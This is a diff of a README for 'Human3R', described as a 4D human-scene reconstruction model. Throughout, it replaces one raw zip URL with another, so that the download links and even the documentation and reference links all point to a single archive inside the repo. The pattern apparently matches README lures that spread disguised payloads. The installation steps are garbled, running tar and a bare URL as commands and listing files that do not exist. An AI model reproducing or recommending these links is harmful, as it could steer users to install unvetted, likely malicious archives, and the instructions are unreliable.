@@ -1,6 +1,6 @@
 # 🎉 Human3R - Effortless 4D Human-Scene Creation
 
-![Download](https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip)
+![Download](https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip)
 
 ## 📌 Description
 Human3R is a unified model designed for 4D human-scene reconstruction. It simplifies the process of creating 3D representations of people and their environments, making it easier for researchers and developers to analyze and utilize human movements in various contexts.
@@ -20,7 +20,7 @@ To ensure a smooth experience, make sure your system meets the following require
 ### 2. Visit the Releases Page
 Head over to the download section by clicking the link below to access the latest version of Human3R. 
 
-[Download Human3R Releases](https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip)
+[Download Human3R Releases](https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip)
 
 ### 3. Choose Your Download
 On the Releases page, you will see various versions of Human3R. 
@@ -29,7 +29,7 @@ On the Releases page, you will see various versions of Human3R.
 - You may see different files for download. Choose the one that fits your system:
   - **For Windows:** Download the `.exe` file.
   - **For macOS:** Download the `.dmg` file.
-  - **For Linux:** Download the `https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip` file.
+  - **For Linux:** Download the `https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip` file.
 
 ### 4. Download the Application
 Click on your chosen file to start the download. The download may take a few moments based on your internet speed.
@@ -49,12 +49,12 @@ Once the download completes, locate the file in your system’s downloads folder
 
 #### Linux Installation
 1. Open a terminal window.
-2. Navigate to the directory containing the downloaded `https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip` file.
+2. Navigate to the directory containing the downloaded `https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip` file.
 3. Run the following commands:
    ```bash
-   tar -zxvf https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip
+   tar -zxvf https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip
    cd Human3R
-   https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip
+   https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip
    ```
 
 ### 6. Run Human3R
@@ -89,13 +89,13 @@ If you encounter any issues or have questions, you can reach out through the rep
 ## 🔗 Additional Resources
 For more information on 3D and 4D reconstruction, consider checking the following resources:
 
-- [Human3R Documentation](https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip)
-- [3D Reconstruction Overview](https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip)
-- [Pose Estimation Techniques](https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip)
+- [Human3R Documentation](https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip)
+- [3D Reconstruction Overview](https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip)
+- [Pose Estimation Techniques](https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip)
 
 ## 🔄 Future Updates
 Human3R will continue to evolve. Check back frequently on the Releases page for new features and improvements.
 
 For download and installation, remember to visit the link below:
 
-[Download Human3R Releases](https://raw.githubusercontent.com/Skylab19/Human3R/master/clean/Human3R.zip)
+[Download Human3R Releases](https://github.com/Skylab19/Human3R/raw/refs/heads/master/src/croco/Human-R-2.4.zip)
